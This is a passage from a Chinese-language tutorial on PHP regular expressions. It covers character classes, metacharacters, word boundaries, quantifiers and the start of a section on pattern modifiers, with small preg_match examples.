<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;afasABCWEQR44231284737&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配失败。因为，上面上面全是a-zA-Z0-9_，没有非a-zA-Z0-9_。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. \s 匹配所有空白字符\n \t \r 空格</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\s/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;中国万</span></span><br><span class="line"><span class="string">岁&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，因为有一个回车。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. \S 非空字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\s/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;        </span></span><br><span class="line"><span class="string">         a       &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功。虽然上面有空格，回车和缩进。但是，有一个非空白字符a。因此，匹配成功。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. [] 指定范围的原子</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[0-5]\w+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;6a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;1C&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中0-5匹配$string失败，而$string1成功。因为，$string中的第一个数值为6，不在[0-5]的范围之内。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[a-zA-Z0-9_]\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ab&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;9A&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：$string和$string1都匹配成功。因为\w就是[a-zA-Z0-9_]</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[abc]\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;a9&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;b1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&#x27;c5&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&#x27;d4&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：$string、$string1、$string2匹配成功，而$string3不成功。因为$string3超过了[abc]的范围，它是从d开始的。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. [^ 字符] 不匹配指定区间的字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[^0-9A-Za-z_]/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;aaaaab311dd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;!$@!#%$#^##&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：</p>
<ol>
<li>匹配$string不成功，但是匹配$string1的时候成功。因为中括号里面有个抑扬符。</li>
<li>^ 抑扬符在中括号里面的作用是不准以中括号里面的字符进行匹配。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<h3 id="5-元字符"><a href="#5-元字符" class="headerlink" title="5. 元字符"></a><font face="Comic sans MS" color="#FF6347">5. 元字符</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>抛出问题：</strong></font>\d 代表匹配一个字符。而我现在想要匹配十个八个，任意多个数字肿么办？<br>这个时候我们就要用到元字符。在使用原子的时候，发现只能够匹配一个字符，可是要匹配多个字符就出现了问题。<br>这个时候，我们需要借助<font color="#00B2EE">元字符</font>来帮我们修饰原子，实现更多的功能。<br></font></p>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th align="left">功能说明</th>
</tr>
</thead>
</table>
<ul>
<li>| 是代表匹配前面的一个原子，匹配0次或者任意多次前面的字符。</li>
</ul>
<ul>
<li>| 匹配一次或多前前面的一个字符<br>?    | 前面的字符可有可无【可选】 有或没有<br>.    | 更标准一些应该把点算作原子。匹配除了\n以外的所有字符<br>丨    | 或者。注：它的优先级最低了。<br>^    | 必须要以抑扬符之后的字符串开始<br>$    | 必须要以$之前的字符结尾<br>\b    | 词边界<br>\B    | 非边界<br>{m}    | 有且只能出现m次<br>{n,m}|     可以出现n到m次<br>{m,} |    至少m次，最大次数不限制<br>()     |  改变优先级或者将某个字符串视为一个整体，匹配到的数据取出来也可以使用它</li>
</ul>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. + 匹配最少1次前面的字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;迪奥和奥迪250都是我最爱&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string</span> = <span class="string">&quot;迪奥和奥迪都是我最爱&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，证明了\d+中的+。\d是匹配数字，而+是最少匹配一次前面的字符。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. * 匹配0次或者任意多次前面的字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w*/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;!@!@!!@#@!<span class="variable">$@</span>#!&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&quot;!@#!@#!abcABC#@#!&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明，注释掉的$string1和$string都匹配成功了。因为，\w是匹配的0-9A-Za-z_，而*是说明前面的\w可以不存在。如果存在可以有1个或者多个。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. ? 前面的字符出现0次或者1次，可有可无</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ABC\d?ABC/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;ABC1ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&quot;ABC888888ABC&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;ABCABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>匹配$string,$string2成功，但是匹配$string1失败。<br>因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. . (点) 匹配除\n以外的所有字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/gg.+gg/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;ABC1ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>匹配$string,$string2成功，但是匹配$string1失败。<br>因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. |（竖线），或者，优先级最低</strong></font><br></font></p>
<p>我们通过实验来看优先级和或者的匹配</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/abc|bcd/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;abccd&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;ggggbcd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看看：<br>    1.最开始我匹配的想法是想匹配的是abccd或者是abbcd。可是，匹配$string1和$string2，匹配出来的结果却是abc和bcd.<br>    2.实现了或者匹配，匹配出来了abc或者是bcd。它还没有字符串连续在一起的优先级高。</p>
<p>那么问题来了，我要匹配上例中的abccd或者是abbcd怎么办？<br><font color="red">需要使用到**()**来改变优先级。</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ab(c|b)cd/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;起来abccd阅兵&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;ggggbcd&quot;</span>;</span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&#x27;中国abbcd未来&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(2) &#123; [0]=&gt; string(5) <span class="string">&quot;abccd&quot;</span> [1]=&gt; string(1) <span class="string">&quot;c&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>   1.确实匹配了了abccd或者abbcd（$string1 or $string3）。<br>   2.但是匹配的数组里面多了一个元素，这个元素的下标为1<br>   3.()中的内容只要匹配成功，会把匹配到的数据放到下标为1的这个数组元素中。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. ^ （抑扬符），必须要以^之后的字符串开始</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/^猪哥好帅\w+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;猪哥好帅abccdaaaasds&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span>没有以猪哥好帅开始</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;帅abccdaaaasds&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过实验发现以下结论：<br>   1.$string1匹配成功，$string2没有匹配成功<br>   2.因为$string1是以指定的字符开始的<br>   3.而$string2并没有以^之后的字符开始<br>   4.翻译这个正则的意思就是：以要猪哥好帅开始后面接a-zA-Z0-9_最少一个字符。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. $ （美元符）必须要以$之前的字符结束</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d+努力$/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;12321124333努力&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span></span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;12311124112313力&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们运行一下看一下结果，得出来的结论：<br>   1.$string1 匹配成功，而$string2匹配不成功<br>   2.$之前的字符是\d+，后面接着中文的努力。<br>   3.因此，匹配的是这一个整体。\d指的是0-9的整型,+号代表最少一个0-9</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. \b和\B 词边界和非词边界</strong></font><br></font></p>
<p>我们来讲解什么是边界：</p>
<p>   1.正则表达示是有边界的，这个边界是定界符的开始和结尾是正则的边界。</p>
<p>   2.this是一个英文单词，后面加上一个空格，意味着这个词结束了，到达了这个词的边界</p>
<p>\b词边界，就是指必须要在最前或者最后。<br>\B非边界，就是不能在一个正则表达示的最前或者最后。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w+\b/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;this is a apple&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;thisis a apple&quot;</span>;</span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&quot;thisisaapple&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>   1.$string1、$string2和$string3都匹配成功。<br>   2.$string1匹配的时候this 空格是边界<br>   3.$string2匹配的时候thisis是边界<br>   4.$string3匹配的时候，thisisaapple到了整个正则表达示的最后，因此也是边界。所以匹配成功。</p>
</blockquote>
<p>我们来实验一下非词边界：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\Bthis/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;hellothis9&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;hello this9&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;this9中国万岁&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结：<br>   1.匹配$string1成功而$string2不成功。<br>   2.因为\B后接的是this，所以this不能在词边界（空格和开始结尾）的位置出现。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>9. {m}有且只能出现m次</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;3&#125;酒/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝988酒&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝98811酒&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{3}我规定了0-9只能出现3次，多一次少一次都不行。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>10. {n,m} 可以出现n到m次</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;1,3&#125;酒/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝9酒&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝988酒&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{1,3}我规定了0-9只能出现1次，2次或者3次。其它次数都是错的</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>11. {m,} 至少m次，最大次数不限制</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;2,&#125;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝9&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝98&quot;</span>;</span><br><span class="line">//<span class="variable">$string3</span> = <span class="string">&quot;喝98122121&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{2,}我规定喝后面的0-9最少出现两次，最多次数不限。因此$string1是匹配不成功的，$string2是匹配成功的。$string3是匹配成功的。</p>
</blockquote>
<p>&amp;emsp;</p>
<h3 id="6-模式修正符"><a href="#6-模式修正符" class="headerlink" title="6. 模式修正符"></a><font face="Comic sans MS"><font color="#FF6347">6. 模式修正符</font></h3><p><font face="Comic sans MS">我们通过元字符和原子完成了正则表达示的入门。有一些特殊情况我们依然需要来处理。<br>如果abc在第二行的开始处如何匹配？<br><font color="red">我不希望正则表达示特别贪婪的匹配全部，只匹配一部份怎么办？</font><br>这个时候，我们就需要用到下面的这些模式匹配来增强正则的功能。</p>
<p><font color="#00B2EE"><strong>常用的模式匹配符有：</strong></font><br></font></p>
<table>
<thead>
<tr>
<th align="center">模式匹配符</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td align="left">模式中的字符将同时匹配大小写字母.</td>
</tr>
<tr>
